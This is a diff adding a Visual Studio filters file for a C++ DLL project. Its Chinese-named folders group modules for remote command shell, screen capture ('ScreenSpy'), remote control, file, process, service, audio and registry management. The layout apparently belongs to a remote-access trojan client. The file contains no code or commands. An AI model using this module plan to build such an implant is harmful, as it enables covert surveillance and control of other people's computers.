@@ -1,0 +1,198 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="源文件">
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
+    </Filter>
+    <Filter Include="头文件">
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <Extensions>h;hh;hpp;hxx;hm;inl;inc;xsd</Extensions>
+    </Filter>
+    <Filter Include="资源文件">
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
+    </Filter>
+    <Filter Include="通讯引擎">
+      <UniqueIdentifier>{fe45a589-8be8-4be4-b7a7-2e7703c79f9d}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="登陆信息">
+      <UniqueIdentifier>{b7587ff8-2b7a-4137-8e43-99c4ac684b42}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="数据结构">
+      <UniqueIdentifier>{5af2ef1d-4ea7-4a96-915a-5f70a9d6d603}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="内核引擎">
+      <UniqueIdentifier>{49ca5504-c21e-442a-a8f7-4e78431531ac}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="远程消息">
+      <UniqueIdentifier>{a0c4f309-19d4-4075-a3b9-99947813f2e8}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="进程管理">
+      <UniqueIdentifier>{4e65387a-05d6-47a5-8358-70cd05e58d9e}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="进程管理\线程管理">
+      <UniqueIdentifier>{6899debc-ff17-4cae-be6d-85ea90e57ef0}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="远程Cmd管理">
+      <UniqueIdentifier>{6e572ba2-4865-4f5c-bc0b-9f4132bc0095}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="远程窗口管理">
+      <UniqueIdentifier>{2bd81188-bbe4-458d-90ba-ba11e79bc25b}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="远程控制">
+      <UniqueIdentifier>{b2de3136-9c42-44f1-9cb6-f78fbea2773d}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="文件管理">
+      <UniqueIdentifier>{75c9ce1c-9af8-46ad-aeec-2eee1f2d3e00}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="服务管理">
+      <UniqueIdentifier>{f394e271-51c3-41cf-9cb4-957f36b1cf2d}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="音频管理">
+      <UniqueIdentifier>{0f228c05-e2c0-4088-870c-b5f9a49b5c79}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="注册表管理">
+      <UniqueIdentifier>{55a8e692-b2c5-4102-aa3f-eac25599c04f}</UniqueIdentifier>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="Dll.h">
+      <Filter>头文件</Filter>
+    </ClInclude>
+    <ClInclude Include="_IOCPClient.h">
+      <Filter>通讯引擎</Filter>
+    </ClInclude>
+    <ClInclude Include="Login.h">
+      <Filter>登陆信息</Filter>
+    </ClInclude>
+    <ClInclude Include="Common.h">
+      <Filter>头文件</Filter>
+    </ClInclude>
+    <ClInclude Include="zconf.h">
+      <Filter>头文件</Filter>
+    </ClInclude>
+    <ClInclude Include="zlib.h">
+      <Filter>头文件</Filter>
+    </ClInclude>
+    <ClInclude Include="_Array.h">
+      <Filter>数据结构</Filter>
+    </ClInclude>
+    <ClInclude Include="Manager.h">
+      <Filter>内核引擎</Filter>
+    </ClInclude>
+    <ClInclude Include="KernelManager.h">
+      <Filter>内核引擎</Filter>
+    </ClInclude>
+    <ClInclude Include="RemoteMessageManager.h">
+      <Filter>远程消息</Filter>
+    </ClInclude>
+    <ClInclude Include="resource.h">
+      <Filter>头文件</Filter>
+    </ClInclude>
+    <ClInclude Include="ProcessManager.h">
+      <Filter>进程管理</Filter>
+    </ClInclude>
+    <ClInclude Include="CmdManager.h">
+      <Filter>远程Cmd管理</Filter>
+    </ClInclude>
+    <ClInclude Include="WindowManager.h">
+      <Filter>远程窗口管理</Filter>
+    </ClInclude>
+    <ClInclude Include="RemoteControl.h">
+      <Filter>远程控制</Filter>
+    </ClInclude>
+    <ClInclude Include="ScreenSpy.h">
+      <Filter>远程控制</Filter>
+    </ClInclude>
+    <ClInclude Include="FileManager.h">
+      <Filter>文件管理</Filter>
+    </ClInclude>
+    <ClInclude Include="ServiceManager.h">
+      <Filter>服务管理</Filter>
+    </ClInclude>
+    <ClInclude Include="AudioManager.h">
+      <Filter>音频管理</Filter>
+    </ClInclude>
+    <ClInclude Include="Audio.h">
+      <Filter>音频管理</Filter>
+    </ClInclude>
+    <ClInclude Include="RegisterManager.h">
+      <Filter>注册表管理</Filter>
+    </ClInclude>
+    <ClInclude Include="Register.h">
+      <Filter>注册表管理</Filter>
+    </ClInclude>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="Dll.cpp">
+      <Filter>源文件</Filter>
+    </ClCompile>
+    <ClCompile Include="_IOCPClient.cpp">
+      <Filter>通讯引擎</Filter>
+    </ClCompile>
+    <ClCompile Include="Login.cpp">
+      <Filter>登陆信息</Filter>
+    </ClCompile>
+    <ClCompile Include="_Array.cpp">
+      <Filter>数据结构</Filter>
+    </ClCompile>
+    <ClCompile Include="Manager.cpp">
+      <Filter>内核引擎</Filter>
+    </ClCompile>
+    <ClCompile Include="KernelManager.cpp">
+      <Filter>内核引擎</Filter>
+    </ClCompile>
+    <ClCompile Include="RemoteMessageManager.cpp">
+      <Filter>远程消息</Filter>
+    </ClCompile>
+    <ClCompile Include="ProcessManager.cpp">
+      <Filter>进程管理</Filter>
+    </ClCompile>
+    <ClCompile Include="CmdManager.cpp">
+      <Filter>远程Cmd管理</Filter>
+    </ClCompile>
+    <ClCompile Include="WindowManager.cpp">
+      <Filter>远程窗口管理</Filter>
+    </ClCompile>
+    <ClCompile Include="RemoteControl.cpp">
+      <Filter>远程控制</Filter>
+    </ClCompile>
+    <ClCompile Include="ScreenSpy.cpp">
+      <Filter>远程控制</Filter>
+    </ClCompile>
+    <ClCompile Include="FileManager.cpp">
+      <Filter>文件管理</Filter>
+    </ClCompile>
+    <ClCompile Include="ServiceManager.cpp">
+      <Filter>服务管理</Filter>
+    </ClCompile>
+    <ClCompile Include="AudioManager.cpp">
+      <Filter>音频管理</Filter>
+    </ClCompile>
+    <ClCompile Include="Audio.cpp">
+      <Filter>音频管理</Filter>
+    </ClCompile>
+    <ClCompile Include="RegisterManager.cpp">
+      <Filter>注册表管理</Filter>
+    </ClCompile>
+    <ClCompile Include="Register.cpp">
+      <Filter>注册表管理</Filter>
+    </ClCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Source.def">
+      <Filter>源文件</Filter>
+    </None>
+  </ItemGroup>
+  <ItemGroup>
+    <ResourceCompile Include="Dll.rc">
+      <Filter>资源文件</Filter>
+    </ResourceCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <Media Include="..\..\res\msg.wav">
+      <Filter>资源文件</Filter>
+    </Media>
+  </ItemGroup>
+</Project>
